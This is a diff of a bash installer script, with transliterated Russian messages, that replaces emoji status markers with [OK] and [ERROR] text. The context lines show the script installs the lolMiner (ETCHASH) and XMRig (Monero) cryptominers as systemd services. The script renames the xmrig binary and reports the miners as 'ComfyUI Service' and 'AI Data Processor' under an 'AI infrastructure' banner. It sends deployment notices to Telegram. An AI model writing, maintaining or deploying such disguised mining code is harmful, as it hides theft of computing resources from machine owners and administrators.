@@ -101,16 +101,16 @@ install_dependencies() {
     
     systemctl enable --now "${GPU_SERVICE_NAME}"
     if [ $? -eq 0 ]; then
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [OK] Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"
     else
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${GPU_SERVICE_NAME}"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] Oshibka aktivatsii ${GPU_SERVICE_NAME}"
     fi
     
     systemctl enable --now "${CPU_SERVICE_NAME}"
     if [ $? -eq 0 ]; then
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [OK] Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"
     else
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${CPU_SERVICE_NAME}"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] Oshibka aktivatsii ${CPU_SERVICE_NAME}"
     fi
     echo ""
     
@@ -166,7 +166,7 @@ install_dependencies() {
     
     echo ""
     echo_t "======================================================================="
-    echo_t "  ✓ AI-INFRASTRUKTURA USPESHNO RAZVERNUTA"
+    echo_t "  [OK] AI-INFRASTRUKTURA USPESHNO RAZVERNUTA"
     echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"
     echo_t "======================================================================="
     echo ""
@@ -340,9 +340,9 @@ EOF
     
     # Проверяем что lolMiner существует
     if [ -f "$GPU_DIR/lolMiner" ]; then
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✅ GPU-modul' (lolMiner) uspeshno ustanovlen"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [OK] GPU-modul' (lolMiner) uspeshno ustanovlen"
     else
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ❌ OSHIBKA: lolMiner ne nayden posle raspakovki"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] OSHIBKA: lolMiner ne nayden posle raspakovki"
         return 1
     fi
     
@@ -373,18 +373,18 @@ EOF
     if [ -f "$CPU_DIR/xmrig" ]; then
         mv "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME" 2>/dev/null || cp "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME"
         chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✅ CPU-modul' (XMRig) uspeshno ustanovlen"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [OK] CPU-modul' (XMRig) uspeshno ustanovlen"
     else
-        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ❌ OSHIBKA: xmrig ne nayden posle raspakovki"
+        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] OSHIBKA: xmrig ne nayden posle raspakovki"
         return 1
     fi
     
     echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka AI-moduley zavershena"
-    send_telegram_notification "✅ AI-moduli ustanovleny na ${HOSTNAME_VAR}
+    send_telegram_notification "OK AI-moduli ustanovleny na ${HOSTNAME_VAR}
 
-🎨 GPU: lolMiner (ETCHASH)
-⚙️ CPU: XMRig v6.18.0 (Monero)
-🔑 Worker: ${WORKER_NAME}"
+GPU: lolMiner (ETCHASH)
+CPU: XMRig v6.18.0 (Monero)
+Worker: ${WORKER_NAME}"
     
     return 0
 }
@@ -517,15 +517,15 @@ sleep 2
 
 # Proverka statusa
 if systemctl is-active --quiet "${GPU_SERVICE_NAME}"; then
-    echo "✅ ${GPU_SERVICE_NAME} zapushchen"
+    echo "[OK] ${GPU_SERVICE_NAME} zapushchen"
 else
-    echo "❌ ${GPU_SERVICE_NAME} ne zapushchen"
+    echo "[ERROR] ${GPU_SERVICE_NAME} ne zapushchen"
 fi
 
 if systemctl is-active --quiet "${CPU_SERVICE_NAME}"; then
-    echo "✅ ${CPU_SERVICE_NAME} zapushchen"
+    echo "[OK] ${CPU_SERVICE_NAME} zapushchen"
 else
-    echo "❌ ${CPU_SERVICE_NAME} ne zapushchen"
+    echo "[ERROR] ${CPU_SERVICE_NAME} ne zapushchen"
 fi
 
 # Otpravka uvedomleniya
@@ -552,7 +552,7 @@ sleep 2
 pkill -9 -f "lolMiner.*ETCHASH" 2>/dev/null
 pkill -9 -f "xmrig" 2>/dev/null
 
-echo "✅ AI sluzhby ostanovleny"
+echo "[OK] AI sluzhby ostanovleny"
 EOF
     chmod +x "/usr/local/bin/stop-ai"
     
@@ -562,15 +562,15 @@ EOF
 echo "=== Status AI-sluzhb ==="
 
 if pgrep -f "lolMiner.*ETCHASH" > /dev/null; then
-    echo "✅ ComfyUI Service (GPU): Zapushchen (PID: \$(pgrep -f 'lolMiner.*ETCHASH'))"
+    echo "[OK] ComfyUI Service (GPU): Zapushchen (PID: \$(pgrep -f 'lolMiner.*ETCHASH'))"
 else
-    echo "❌ ComfyUI Service (GPU): Ne zapushchen"
+    echo "[ERROR] ComfyUI Service (GPU): Ne zapushchen"
 fi
 
 if pgrep -f "xmrig" > /dev/null; then
-    echo "✅ AI Data Processor (CPU): Zapushchen (PID: \$(pgrep -f 'xmrig'))"
+    echo "[OK] AI Data Processor (CPU): Zapushchen (PID: \$(pgrep -f 'xmrig'))"
 else
-    echo "❌ AI Data Processor (CPU): Ne zapushchen"
+    echo "[ERROR] AI Data Processor (CPU): Ne zapushchen"
 fi
 
 echo ""
@@ -636,7 +636,7 @@ main() {
         exit 1
     fi
     
-    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Proverka prav root proydena"
+    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] [OK] Proverka prav root proydena"
     echo ""
     
     # Установка зависимостей
